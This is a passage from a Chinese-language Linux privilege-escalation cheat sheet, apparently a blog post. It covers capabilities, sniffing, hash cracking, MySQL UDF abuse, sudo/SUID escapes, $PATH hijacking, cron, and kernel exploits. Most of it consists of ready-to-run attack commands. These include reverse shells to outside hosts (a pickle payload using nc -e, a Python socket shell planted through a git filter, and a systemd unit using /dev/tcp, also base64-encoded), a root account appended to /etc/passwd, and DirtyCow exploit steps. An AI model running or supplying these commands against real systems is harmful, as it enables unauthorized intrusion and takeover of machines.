<td style="text-align:left">允许通过 multicast netlink 套接字读取审计日志</td>
</tr>
<tr>
<td>CAP_AUDIT_WRITE</td>
<td style="text-align:left">将记录写入内核审计日志</td>
</tr>
<tr>
<td>CAP_BLOCK_SUSPEND</td>
<td style="text-align:left">使用可以阻止系统挂起的特性</td>
</tr>
<tr>
<td>CAP_CHOWN</td>
<td style="text-align:left">修改文件所有者的权限</td>
</tr>
<tr>
<td>CAP_DAC_OVERRIDE</td>
<td style="text-align:left">忽略文件的 DAC 访问限制</td>
</tr>
<tr>
<td>CAP_DAC_READ_SEARCH</td>
<td style="text-align:left">忽略文件读及目录搜索的 DAC 访问限制</td>
</tr>
<tr>
<td>CAP_FOWNER</td>
<td style="text-align:left">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td>
</tr>
<tr>
<td>CAP_FSETID</td>
<td style="text-align:left">允许设置文件的 setuid 位</td>
</tr>
<tr>
<td>CAP_IPC_LOCK</td>
<td style="text-align:left">允许锁定共享内存片段</td>
</tr>
<tr>
<td>CAP_IPC_OWNER</td>
<td style="text-align:left">忽略 IPC 所有权检查</td>
</tr>
<tr>
<td>CAP_KILL</td>
<td style="text-align:left">允许对不属于自己的进程发送信号</td>
</tr>
<tr>
<td>CAP_LEASE</td>
<td style="text-align:left">允许修改文件锁的 FL_LEASE 标志</td>
</tr>
<tr>
<td>CAP_LINUX_IMMUTABLE</td>
<td style="text-align:left">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td>
</tr>
<tr>
<td>CAP_MAC_ADMIN</td>
<td style="text-align:left">允许 MAC 配置或状态更改</td>
</tr>
<tr>
<td>CAP_MAC_OVERRIDE</td>
<td style="text-align:left">忽略文件的 DAC 访问限制</td>
</tr>
<tr>
<td>CAP_MKNOD</td>
<td style="text-align:left">允许使用 mknod() 系统调用</td>
</tr>
<tr>
<td>CAP_NET_ADMIN</td>
<td style="text-align:left">允许执行网络管理任务</td>
</tr>
<tr>
<td>CAP_NET_BIND_SERVICE</td>
<td style="text-align:left">允许绑定到小于 1024 的端口</td>
</tr>
<tr>
<td>CAP_NET_BROADCAST</td>
<td style="text-align:left">允许网络广播和多播访问</td>
</tr>
<tr>
<td>CAP_NET_RAW</td>
<td style="text-align:left">允许使用原始套接字</td>
</tr>
<tr>
<td>CAP_SETGID</td>
<td style="text-align:left">允许改变进程的 GID</td>
</tr>
<tr>
<td>CAP_SETFCAP</td>
<td style="text-align:left">允许为文件设置任意的 capabilities</td>
</tr>
<tr>
<td>CAP_SETPCAP</td>
<td style="text-align:left">参考 capabilities man page</td>
</tr>
<tr>
<td>CAP_SETUID</td>
<td style="text-align:left">允许改变进程的 UID</td>
</tr>
<tr>
<td>CAP_SYS_ADMIN</td>
<td style="text-align:left">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td>
</tr>
<tr>
<td>CAP_SYS_BOOT</td>
<td style="text-align:left">允许重新启动系统</td>
</tr>
<tr>
<td>CAP_SYS_CHROOT</td>
<td style="text-align:left">允许使用 chroot() 系统调用</td>
</tr>
<tr>
<td>CAP_SYS_MODULE</td>
<td style="text-align:left">允许插入和删除内核模块</td>
</tr>
<tr>
<td>CAP_SYS_NICE</td>
<td style="text-align:left">允许提升优先级及设置其他进程的优先级</td>
</tr>
<tr>
<td>CAP_SYS_PACCT</td>
<td style="text-align:left">允许执行进程的 BSD 式审计</td>
</tr>
<tr>
<td>CAP_SYS_PTRACE</td>
<td style="text-align:left">允许跟踪任何进程</td>
</tr>
<tr>
<td>CAP_SYS_RAWIO</td>
<td style="text-align:left">允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td>
</tr>
<tr>
<td>CAP_SYS_RESOURCE</td>
<td style="text-align:left">忽略资源限制</td>
</tr>
<tr>
<td>CAP_SYS_TIME</td>
<td style="text-align:left">允许改变系统时钟</td>
</tr>
<tr>
<td>CAP_SYS_TTY_CONFIG</td>
<td style="text-align:left">允许配置 TTY 设备</td>
</tr>
<tr>
<td>CAP_SYSLOG</td>
<td style="text-align:left">允许使用 syslog() 系统调用</td>
</tr>
<tr>
<td>CAP_WAKE_ALARM</td>
<td style="text-align:left">允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)</td>
</tr>
</tbody>
</table>
<h3 id="流量监听"><a class="markdownIt-Anchor" href="#流量监听"></a> 流量监听</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -D</span><br><span class="line">timeout 120 tcpdump -i interface -w cap.pcap</span><br><span class="line">tcpdump -r cap.pcap</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 120 tshark -i interface</span><br></pre></td></tr></table></figure>
<h3 id="shell"><a class="markdownIt-Anchor" href="#shell"></a> Shell</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">perl -e <span class="string">&#x27;exec &quot;/bin/bash&quot;;&#x27;</span></span><br><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>tty(输出至终端/需要注意tty的写入权限)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tty</span><br><span class="line">&#x2F;dev&#x2F;pts&#x2F;0</span><br><span class="line">cat &#x2F;etc&#x2F;passwd &gt; &#x2F;dev&#x2F;pts&#x2F;0</span><br></pre></td></tr></table></figure>
<h3 id="密码"><a class="markdownIt-Anchor" href="#密码"></a> 密码</h3>
<ul>
<li>密码共用
<ul>
<li>WEB账户</li>
<li>WEB admin</li>
<li>SSH</li>
<li>FTP</li>
<li>MySQL</li>
<li>root</li>
<li>Redis</li>
</ul>
</li>
<li><code>/etc/passwd</code> &amp; <code>/etc/shadow</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat --<span class="built_in">help</span> | grep Unix</span><br><span class="line">hashcat -m 500 -a 0 -o found.txt crack.hash rockyou.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$1$flag$vqjCxzjtRc7PofLYS2lWf/&#x27;</span> &gt; passwd</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br></pre></td></tr></table></figure>
<ul>
<li>unshadow</li>
<li>ssh</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py id_rsa &gt; ssh</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt ssh</span><br></pre></td></tr></table></figure>
<ul>
<li>wordpress – $P$ – phpass</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">passwd/shadow</th>
<th style="text-align:center">Method</th>
<th style="text-align:center">hashcat -m</th>
<th style="text-align:center">john --format=</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$1</td>
<td style="text-align:center">md5</td>
<td style="text-align:center">500</td>
<td style="text-align:center">md5crypt-long</td>
</tr>
<tr>
<td style="text-align:center">$2*</td>
<td style="text-align:center">bcrypt(Blow Fish)</td>
<td style="text-align:center">3200</td>
<td style="text-align:center">bcrypt</td>
</tr>
<tr>
<td style="text-align:center">$5</td>
<td style="text-align:center">sha256</td>
<td style="text-align:center">7400</td>
<td style="text-align:center">sha256crypt</td>
</tr>
<tr>
<td style="text-align:center">$6</td>
<td style="text-align:center">sha512</td>
<td style="text-align:center">1800</td>
<td style="text-align:center">sha512crypt</td>
</tr>
</tbody>
</table>
<h3 id="本地服务探测"><a class="markdownIt-Anchor" href="#本地服务探测"></a> 本地服务探测</h3>
<ul>
<li>netstat</li>
<li>ss</li>
<li>lsof</li>
</ul>
<h3 id="udf提权"><a class="markdownIt-Anchor" href="#udf提权"></a> UDF提权</h3>
<ul>
<li>插件路径: <code>show variables like 'plugin_dir';</code></li>
<li>文件权限: <code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code>
<ul>
<li>mysqld.conf: “secure_file_priv=”</li>
<li>该值为空则无限制</li>
<li>该值为NULL则不可写入</li>
<li>该值为路径则可写入该路径（不包含子路径）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));</span><br><span class="line">select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;</span><br><span class="line">create function sys_eval returns string soname &#39;udf.so&#39;;</span><br><span class="line">select sys_eval(&#39;id&#39;);</span><br></pre></td></tr></table></figure>
<h4 id="udf文件dllso"><a class="markdownIt-Anchor" href="#udf文件dllso"></a> UDF文件(dll/so)</h4>
<p><strong>Metasploit</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.dll</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.so</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.so</span><br></pre></td></tr></table></figure>
<p>可以使用IDA来查看具体有哪些函数</p>
<ul>
<li>sys_get</li>
<li>sys_exec</li>
<li>sys_eval</li>
<li>sys_set</li>
<li>sys_bineval</li>
</ul>
<p><strong>SQLMap</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;32&#x2F;lib_mysqludf_sys.so_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;32&#x2F;lib_mysqludf_sys.dll_</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;64&#x2F;lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure>
<p><strong>Decode</strong><br />
<code>python .\cloak.py -d -i ..\..\udf\mysql\linux\64\lib_mysqludf_sys.so_ -o linux_udf_64.so</code></p>
<h4 id="mysql执行系统命令"><a class="markdownIt-Anchor" href="#mysql执行系统命令"></a> Mysql执行系统命令</h4>
<ul>
<li>system whoami<br />
(version &gt;= 5.7)</li>
</ul>
<h3 id="sudo-suid"><a class="markdownIt-Anchor" href="#sudo-suid"></a> SUDO &amp; SUID</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
</blockquote>
<p>使用Shell脚本进行提权，参数带有空格时需要用引号</p>
<p>SUID: <code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">sudo -i</span><br><span class="line">cat &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure>
<p>查看可以以sudo模式运行的程序<br />
<code>sudo -l</code></p>
<ul>
<li>
<p>当sudo权限的命令受到执行路径的限制时，可以使用<code>../</code>来进行bypass</p>
</li>
<li>
<p>doas</p>
</li>
<li>
<p>python: <code>python -c 'import os;os.system(&quot;/bin/bash&quot;)'</code></p>
<ul>
<li>input(): <code>__import__('os').system('/bin/sh')</code></li>
<li>lib文件写入命令</li>
<li>pickle unserialize</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">class RCE(object):</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		cmd &#x3D; (&#39;nc -e &#x2F;bin&#x2F;bash 192.168.0.1 8080&#39;)</span><br><span class="line">		return os.system, (cmd,)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	print(base64.urlsafe_b64encode(pickle.dumps(RCE())))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">class payload(object):</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		return (eval,(&quot;(open(&#39;&#x2F;flag,txt&#39;),&#39;r).read()&quot;,))</span><br><span class="line"></span><br><span class="line">print(urllib.quote((pickle.dumps(payload()))))</span><br></pre></td></tr></table></figure>
<ul>
<li>php: <code>php -r &quot;system('/bin/bash');&quot;</code></li>
<li>rpm: <code>rpm --eval '%&#123;lua:posix.exec(&quot;/bin/bash&quot;)&#125;'</code></li>
<li>dpkg</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gem install fpm</span><br><span class="line">mkdir exp &amp;&amp; cd exp</span><br><span class="line">echo -e &#39;#!&#x2F;bin&#x2F;bash\n&#x2F;bin&#x2F;bash&#39; &gt; exp.sh</span><br><span class="line">fpm -s dir -t deb -n exp --before-install exp.sh .&#x2F;</span><br><span class="line">dpkg -i exp_1.0_amd64.deb</span><br></pre></td></tr></table></figure>
<ul>
<li>ruby: <code>ruby -e 'exec &quot;/bin/bash&quot;'</code></li>
<li>gcc: <code>gcc -wrapper /bin/bash,-s .</code></li>
<li>perl: <code>perl -e 'exec &quot;/bin/bash&quot;;'</code></li>
<li>java:</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">sudo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">	processBuilder.command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami &gt; whoami&quot;</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Process process = processBuilder.start();</span><br><span class="line">			BufferedReader reader =</span><br><span class="line">					<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">			String line;</span><br><span class="line">			<span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">				System.out.println(line);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">int</span> exitCode = process.waitFor();</span><br><span class="line">			System.out.println(<span class="string">&quot;\nExited with error code : &quot;</span> + exitCode);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">java sudo</span><br></pre></td></tr></table></figure>
<ul>
<li>mysql: <code>mysql -e '\! /bin/bash'</code></li>
<li>nmap
<ul>
<li>2.02 &lt;= nmap -v &lt;=5.21</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure>
<ul>
<li>vim
<ul>
<li>浏览<code>/etc/shadow</code></li>
<li>shell</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
<ul>
<li>less</li>
<li>more</li>
<li>nano</li>
<li>cp
<ul>
<li>覆盖passwd（垂直）</li>
<li>写入authorized_keys（水平）</li>
<li>–no-preserve=mode</li>
</ul>
</li>
<li>mv</li>
<li>wget</li>
<li>find
<ul>
<li><code>find . -exec whoami \;</code></li>
<li><code>find . -exec /bin/bash -p\;</code></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读取：***</span><br><span class="line">写入：**2</span><br><span class="line">执行：**4(bash); 1**, *1*, **1(exec)</span><br></pre></td></tr></table></figure>
<ul>
<li>bash</li>
<li>bash -p</li>
<li>awk
<ul>
<li><code>awk '/RE/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd</code></li>
<li><code>/tmp/1</code> 是写好的账户信息</li>
<li>RE用于匹配passwd中某单独一行的结尾部分</li>
</ul>
</li>
<li>tee: <code>echo 1 | tee /etc/passwd</code></li>
<li>unzip</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd &gt; passwd</span><br><span class="line">echo data &gt;&gt; passwd</span><br><span class="line">zip new.zip passwd</span><br><span class="line">unzip new.zip -d &#x2F;etc&#x2F;</span><br></pre></td></tr></table></figure>
<ul>
<li>git filter<br />
Git提供了一种过滤机制，允许用户在文件检出或提交到Git存储库时将自定义脚本应用于文件。<br />
过滤机制由两种类型的过滤器组成：clean过滤器和smudge过滤器。clean过滤器用于在将文件提交到Git存储库之前转换文件的内容。smudge过滤器用于在从Git存储库检出文件时转换文件的内容。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;0.0.0.0&#x27;,9995));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span> &gt; /tmp/BFL</span><br><span class="line">chmod +x /tmp/BFL</span><br><span class="line">git init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*.php filter=indent&#x27;</span> &gt; /var/www/image/.git/info/attributes</span><br><span class="line">git config filter.indent.clean /tmp/BFL</span><br><span class="line">sudo -u svc /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>systemctl</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.*.*&#x2F;9996 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n W1NlcnZpY2VdCkV4ZWNTdGFydD0vYmluL2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMi85OTk2IDA+JjEiCgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQ&#x3D; | base64 -d &gt; &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;bufferfly.service</span><br></pre></td></tr></table></figure>
<h4 id="path"><a class="markdownIt-Anchor" href="#path"></a> $PATH</h4>
<ul>
<li>目标文件为二进制可执行文件</li>
<li>需要知道目标文件所执行的命令</li>
<li>strings查看可执行文件内容</li>
</ul>
<p><strong>echo</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
<p><strong>copy</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
<p><strong>symlink</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">ln -s &#x2F;bin&#x2F;bash ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
<h3 id="mail"><a class="markdownIt-Anchor" href="#mail"></a> mail</h3>
<p><code>cat /var/spool/mail/*</code></p>
<h3 id="crontab"><a class="markdownIt-Anchor" href="#crontab"></a> crontab</h3>
<p><code>cat /etc/crontab</code><br />
<code>ls -la /var/spool/cron/</code><br />
<code>ls -la /tmp</code><br />
<code>crontab -e</code></p>
<p>crontab所执行的命令一般来说是难以通过ps命令来发现的，除非是在命令执行的过程中正好使用ps命令查看进程<br />
这对于耗时长的命令或者是使用脚本循环执行命令来说是可行的，但是对于几乎瞬时完成的命令则是束手无策<br />
可以使用pspy来持续地监视后台进程<br />
<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
<ul>
<li>一般的crontab设置为整分运行，pspy每分钟的第一秒显示的命令即为crontab的内容</li>
<li>目录权限
<ul>
<li>r 列出目录中的内容</li>
<li>w 在目录中增加删除文件，修改文件名</li>
<li>x 进入目录以及对目录下的文件进行操作</li>
<li>r-- 可以在不进入目录的情况下列出目录下的文件，但不能查看文件详细信息</li>
<li>–x 可以在单独列出已知文件，并查看文件详细信息</li>
</ul>
</li>
</ul>
<h3 id="passwd可写"><a class="markdownIt-Anchor" href="#passwd可写"></a> passwd可写</h3>
<p><code>ls -l /etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">	$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1</span><br><span class="line">echo &#39;test:$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<h3 id="系统漏洞提权"><a class="markdownIt-Anchor" href="#系统漏洞提权"></a> 系统漏洞提权</h3>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/initstring/dirty_sock">CVE-2019-7304</a></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 18.10</span><br><span class="line">Ubuntu 18.04 LTS</span><br><span class="line">Ubuntu 16.04 LTS</span><br><span class="line">Ubuntu 14.04 LTS</span><br><span class="line">2.28 &lt; snapd &lt; 2.37</span><br><span class="line">网络连通</span><br></pre></td></tr></table></figure>
<ul>
<li>DirtyCow</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io</span><br><span class="line">cd dirtycow.github.io</span><br><span class="line">gcc dirtyc0w.c -o dirtycow -pthread</span><br><span class="line">.&#x2F;dirtycow &#x2F;etc&#x2F;group “$(sed ‘&#x2F;\(sudo*\)&#x2F; s&#x2F;$&#x2F;,test&#x2F;’ &#x2F;etc&#x2F;group)”</span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>
<ul>
<li>40616.c</li>
</ul>
<h3 id="文件传输"><a class="markdownIt-Anchor" href="#文件传输"></a> 文件传输</h3>
<ul>
<li>FTP</li>
<li>SCP</li>
<li>HTTP
<ul>
<li><code>python2 -m SimpleHTTPServer 80 &amp;</code></li>
<li><code>python3 -m http.server 80&amp;</code></li>
</ul>
</li>
</ul>
<h3 id="内网代理"><a class="markdownIt-Anchor" href="#内网代理"></a> 内网代理</h3>
<ul>
<li>meterpreter(socks4)</li>
</ul>
